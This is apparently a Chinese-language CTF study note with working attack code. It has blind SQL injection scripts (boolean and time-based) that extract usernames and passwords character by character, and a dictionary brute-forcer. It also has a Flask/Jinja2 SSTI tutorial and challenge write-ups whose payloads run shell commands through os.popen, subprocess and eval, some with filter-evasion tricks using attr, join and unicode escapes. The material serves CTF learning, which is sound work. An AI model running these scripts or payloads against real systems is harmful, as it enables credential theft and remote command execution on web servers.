**sql注入布尔盲注脚本**
```python
import requests  
url = input("请输入url:")  
TRUE_TEXT='You are in...........'  
  
def check(payload):  
    r =requests.get(url,params={"id":payload})  
    # r =requests.post(url,data={"name":payload})  
    return TRUE_TEXT in r.text  
result =""  
chars = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
  
length =0  
for i in range(1,500):  
    #1'and length((select database()))={i}--  
    #1'and length((select group_concat(table_name) from information_schema.tables where table_schema='security'))={i}--    
    #1'and length((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))={i}--    
    #1'and length((select group_concat(username,password) from users))={i}--    
    payload = f"1'and length((select group_concat(username,password) from users))={i}-- "  
    if check(payload):  
        length =i  
        break  
print(f"length = {length}")  
  
for i in range(1,length+1):  
    for c in chars:  
        #1'and substr((select database()),{i},1)='{c}'--  
        #1'and substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{c}'--        #1'and substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),{i},1)='{c}'--        
        #1'and substr((select group_concat(username,password) from users),{i},1)='{c}'--
        payload = f"1'and substr((select group_concat(username,password) from users),{i},1)='{c}'-- "  
        if check(payload):  
            result += c;  
            break  
    print(result)  
print(f"最终结果:{result}")
```
**时间盲注脚本**
```python
import requests  
import time  
  
url=input("请输入url:")  
  
def check(payload):  
    start_time = time.time()  
    requests.get(url,params={"id":payload},timeout=3)  
    #r=requests.post(url,data={"id":payload},timeout=1)  
    response_time = time.time()-start_time  
    for _ in range(3):#通过增加多次校验（循环 3 次判断延迟）来提升匹配准确性  
        if response_time>=1.9:  
            return 1  
        else:  
            return 0  
  
result=""  
chars=r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
length=0  
for i in range(500):  
    #1'and if(length((select database()))={i},sleep(2),1)--  
    #1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema='security'))={i},sleep(2),1)--    #1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))={i},sleep(2),1)--    
    #1'and if(length((select group_concat(username,password) from users))={i},sleep(2),1)--
    payload=f"1'and if(length((select group_concat(username,password) from users))={i},sleep(2),1)-- "  
    if check(payload):  
        length=i  
        break  
print(f"长度是{length}")  
  
for i in range(1,length+1):  
    for c in chars:  
        #1'and if(substr((select database()),{i},1)='{c}',sleep(2),1)--  
        #1'and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{c}',sleep(2),1)--        
        #1'and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),{i},1)='{c}',sleep(2),1)--        
        #1'and if(substr((select group_concat(username,password) from users),{i},1)='{c}',sleep(2),1)--
        payload=f"1'and if(substr((select group_concat(username,password) from users),{i},1)='{c}',sleep(2),1)-- "  
        if check(payload):  
            result += c  
            break  
    print(result)  
  
print(f"最终结果是{result}")
```
写脚本时发现一个问题，payload的最后的注释不能用`--+`必须用`-- `,因为二分法的代码太难理解了，就自己写了这个遍历的脚本，效率低，但是好理解
**单字典爆破脚本**
```python
import requests  
  
url=input("请输入url:")  
payload=input("请输入payload(用FUZZ表示要爆破的部分):")  
modes=input("请输入请求方式(get/post):")  
pname=input("请输入参数名:")  
listname=input("请输入你要导入的字典路径")  
if modes=="get":  
    with open(listname,"r",encoding="utf-8") as f:  
        print("开始爆破啦!!!")  
        for line in f.readlines():  
            dict_content=line.strip()#去除字典行的换行符和空格  
            current_payload=payload.replace("FUZZ",dict_content)#替换payload中的FUZZ为字典内容  
            r = requests.get(url,params={pname:current_payload})  
            print(r.status_code)  
            if(r.status_code==200):  
                print(f"payload{current_payload}成功了^_^!!!")  
            else:  
                print("失败")  
if modes=="post":  
    with open(listname,"r",encoding="utf-8") as f:  
        print("开始爆破啦!!!")  
        for line in f.readlines():  
            dict_content=line.strip()#去除字典行的换行符和空格  
            current_payload=payload.replace("FUZZ",dict_content)#替换payload中的FUZZ为字典内容  
            r = requests.post(url,data={pname:current_payload})  
            print(r.status_code)  
            if(r.status_code==200):  
                print(f"payload{current_payload}成功了^_^!!!")  
            else:  
                print("失败")
```
**脚本跑出的题目**:
 `[HNCTF 2022 WEEK2]ez_SSTI`
直接用脚本
```python
import requests  
url=input('请输入url链接:')  
for i in range(500):  
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}#name可能需要根据实际情况变更  
    try:  
        response=requests.get(url,params=data)  
        #print(response.text)  
        if response.status_code == 200:  
            if '_frozen_importlib_external.FileLoader' in response.text:  
                print(i)  
                data1 = {"name":"{{().__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat flag')\").read()}}"}  
                response1 = requests.get(url, params=data1)  
                print(response1.text)  
    except:  
        pass
```
得到flag![](./image/68.png)
## SSTI模板注入
### flask框架
Flask 是一个轻量级的 Python Web 框架，基于 Werkzeug 工具箱和 Jinja2 模板引擎，以简洁、灵活、易扩展著称，适合快速开发小型到中型的 Web 应用。
例如可以用代码
```python
from flask import Flask  
  
app = Flask(__name__)#创建 Flask 应用实例  
  
@app.route('/')# 定义路由：访问根路径时触发的函数  
def hello_world():  
    return "hello world!!!"  
@app.route('/flag')# 定义路由：访问/flag时触发的函数  
def cat_flag():  
    return "flag{Y0u_f1nd_M3!!}"  
if __name__ == '__main__':# 启动应用（仅在直接运行脚本时执行）  
    app.run(host='0.0.0.0',debug=True)# debug=True 开启调试模式，代码修改后自动重启
```
运行代码后访问`http://127.0.0.1:5000`可以看到hello world!!!
### 模板引擎
模板引擎是**分离数据与界面展示**的工具，它允许开发者在模板文件中嵌入变量、逻辑控制（如条件判断、循环），最终通过引擎渲染生成动态的 HTML（或其他格式）内容。简单来说，模板引擎让你可以用 “模板 + 数据” 的方式生成最终页面，避免直接在代码中拼接 HTML 字符串，提升代码可读性和维护性。Flask 中默认使用的是 **Jinja2** 模板引擎
### 函数
***
- `render_template()`：渲染模板文件，这是最常用的函数，用于加载并渲染 `templates` 目录下的模板文件，支持传递变量到模板。
```python
from flask import render_template
@app.route('/user/<name>')  
def user(name):  
    return render_template('user.html',name=name,age=20)# 传递变量 name、age 到模板 user.html
```

```html
<h1>Hello,{{name}}!!!</h1>  
<p>your age is {{age}}</p>
```
- 模板中用 `{{ 变量名 }}` 渲染变量，Jinja2 会自动替换为传入的数据。
***
-  `render_template_string()`：渲染字符串模板，如果模板内容不是文件，而是字符串，可以用这个函数直接渲染字符串模板。
```python
from flask import render_template_string
@app.route('/string')  
def string():  
    template_str="<h1>Hello,{{name}}!!"  
    return render_template_string(template_str,name="niu")
```
***
- `url_for()`：生成 URL（模板内 / 外均可使用）,虽然不是模板引擎的函数，但它常与模板配合，用于生成动态 URL（如静态文件、路由地址），避免硬编码。
```html
<!-- 生成静态文件（如 CSS）的 URL -->
<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
<!-- 生成路由的 URL（对应视图函数名） -->
<a href="{{ url_for('user', name='Alice') }}">Alice 的主页</a>
```
### Jinja2 模板引擎的核心语法
#### 1. 变量与过滤器
- 变量用 `{{ 变量 }}` 渲染，支持点语法访问属性（如 `{{ user.name }}`）。
- 过滤器用于修改变量，格式：`{{ 变量|过滤器 }}`（如 `{{ name|upper }}` 转大写）。
- **常用过滤器**-`safe`：禁用转义（如 `{{ html_content|safe }}`）
-  `length`：获取长度（`{{ list|length }}`）
- `default`：默认值（`{{ value|default('N/A') }}`）
#### 2.逻辑控制
- 条件判断：
```html
{% if age>=18 %}  
    <p>成年人</p>  
{% else %}  
    <p>未成年人</p>  
{% endif %}
```
- 循环：
```html
<u>  
    {% for user in user_list %}  
        <li>{{user.name}}-{{user.age}}</li>  
    {% endfor %}  
</u>
```
- 父模板（`base.html`）定义可替换的 `block`：
```html
<!DOCTYPE html>
 <html> 
 <head> 
 <title>{% block title %}默认标题{% endblock %}</title>
  </head>
   <body> {% block content %}{% endblock %} </body> 
   </html>
```
- 宏（`macro`）：模板中的 “函数”
```html
{% macro input(name, type='text', value='') %}
    <input type="{{ type }}" name="{{ name }}" value="{{ value }}">
{% endmacro %}

<!-- 使用宏 -->
{{ input('username') }}
{{ input('password', type='password') }}
```

## SSTI模板注入漏洞
SSTI（server-side template injection)为服务端模板注入攻击，它主要是由于框架的不规范使用而导致的。主要为python的一些框架，如 jinja2 mako tornado django flask、PHP框架smarty twig thinkphp、java框架jade velocity spring等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，**模板渲染其实并没有漏洞**，主要是程序员**对代码不规范不严谨**造成了模板注入漏洞，造成模板可控。注入的原理可以这样描述：**当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑**。
### 模板引擎判断方法
![判断](./image/判断.png)
绿色线表示回显49,红色线表示原样照印
### 魔术方法
- `__class__`查找当前类型的所属对象
- `__base__`沿着父子类的关系向上走一个
- `__mro__`查找当前类对象的所有继承类
- `__subclasses__()`查找父类下的所有子类
-  `__init__`查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载
- `__globals__`函数会以字典的形式返回当前对象的全部全局变量
### SSTI常用注入模块
#### 文件读取
查找子类：`<class '_frozen_importlib_external.FileLoader'>`这个模块可以对服务器文件进行读取。
具体这个模块在哪个位置可以用python脚本查，
```python
import requests  
url=input('请输入url链接:')  
for i in range(500):  
    data={"name":"{{''.__class__.__base__.__subclasses__()["+str(i)+"]}}"}#name可能需要根据实际情况变更  
    try:  
        response=requests.post(url,data=data)  
        #print(response.text)  
        if response.status_code == 200:  
            if '_frozen_importlib_external.FileLoader' in response.text:  
                print(response.text)  
                print(i)  
    except:  
        pass
```
执行后找到79，后`{{''.__class__.__base__.__subclasses__()[79]["get_data"](0,"/flag")}}`输出内容，get_data是_frozen_importlib_external.FileLoader下自带函数
而
```python
import requests  
url = input("请输入url链接:")  
for i in range(500):  
    data={"name":"{{''.__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"}  
    try:  
        response = requests.post(url,data=data)  
        if response.status_code == 200:  
            if "eval" in response.text:  
                print(i)  
    except:  
        pass
```
可以查找哪些里有eval函数(高危命令执行函数)，记得每次的参数可能不同，'name'可能要根据实际情况修改
#### os模块
在其他函数里直接调用os模块
通过config,调用os`{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}`
通过url_for调用os
`{{url_for.__globals__.os.popen('whoami').read()}}`
在已经加载的os模块的子类里直接调用os模块
`{{''.__class__.__bases__[0].__subclasses__()[199].__init__.globals__['os'].popen('ls /').read()}}`
显示当前flask模块有哪些函数和对象
`{{self.__dict__._TemplateReference__context.keys()}}`可能显示
`dict_keys(['url_for', 'lipsum', 'request', 'session', 'range', 'get_flashed_messages', 'cycler', 'namespace', 'config', 'dict', 'joiner', 'g'])`其中url_for,lipsum,get_flashed_messages有内置os模块
`{{lipsum.__globals__}}`在输出中搜索一下，找到有os,eval,`{{lipsum.__globals__.os.popen('ls').read()}}`这样就可以执行具体命令,哪些类里面有os模块也可以用py脚本遍历出来，之后用`{{''.__class__.__base__.__subclasses__()[426].__init__.__globals__.os.popen('ls').read()}}`就可以执行命令
#### importlib类执行命令
用脚本查出来是第69个，可以加载第三方库，使用load_module加载os
`{{''.__class__.__base__.__subclasses__()[69]['load_module']('os')['popen']('ls -al').read()}}`执行命令
#### linecache函数执行命令
 linecache可以读取任意一个文件的某一行，这个函数也引用了os模块，用法类似`{{''.__class__.__base__.__subclasses__()[191].__init__.__globals__['linecache']['os'].popen('ls').read()}}`
#### subprocess.Popen类
`{{''.__class__.__base__.__subclasses__()[200]('ls',shell=True,stdout=-1).communicate()[0].strip()}}`
## WP
### `[HNCTF 2022 WEEK2]ez_SSTI`

直接用脚本
```python
import requests  
url=input('请输入url链接:')  
for i in range(500):  
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}#name可能需要根据实际情况变更  
    try:  
        response=requests.get(url,params=data)  
        #print(response.text)  
        if response.status_code == 200:  
            if '_frozen_importlib_external.FileLoader' in response.text:  
                print(i)  
                data1 = {"name":"{{().__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat flag')\").read()}}"}  
                response1 = requests.get(url, params=data1)  
                print(response1.text)  
    except:  
        pass
```
得到flag![](./image/68.png)
### `[HNCTF 2022 WEEK3]ssssti`
可以测试一下，把下划线，单双引号，都过滤了，os字符也过滤了,可以用lipsum和attr绕过下划线和单双引号，用dict和join拼接，下划线可以从{%set a=({}|select()|string()|list)%}{{a}}中取到，下划线是第25个，空格是第11个(后面cat flag时要用到空格),o和s分别是第9，19个，最开始要使用的payload是`{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat flag")|attr("read")()}}`绕过一些过滤得到最终payload如下，最终payloads`{%set a=({}|select()|string()|list)[24]%}{%set space=({}|select()|string()|list)[10]%}{%set o=({}|select()|string()|list)[8]%}{%set s=({}|select()|string()|list)[18]%}{%set globals=(a,a,dict(globals=a)|join,a,a)|join%}{%set getitem=(a,a,dict(getitem=a)|join,a,a)|join%}{%set ls=dict(ls=a)|join%}{%set read=dict(read=a)|join%}{%set so=(o,s)|join%}{%set popen=dict(popen=a)|join%}{%set flag=(dict(cat=a)|join,space,dict(flag=a)|join)|join%}{{lipsum|attr(globals)|attr(getitem)(so)|attr(popen)(flag)|attr(read)()}}`

### `[安洵杯 2020]Normal SSTI`
试一下，把`. _ {{}} [ ]`都过滤了，空格都过滤了，但`{%%}`没过滤，可以用`{%print()%}`,因为`.`和`[]`被过滤，所以使用flask的|attr来调用方法,`''|attr("__class__")`等于`''.__class__`,其他过滤的地方都用unicode编码绕过paylaod`lipsum|attr("__globals__").get("os").popen("ls").read()`,最终paylaod`{%print((lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067")|attr("read")()))%}`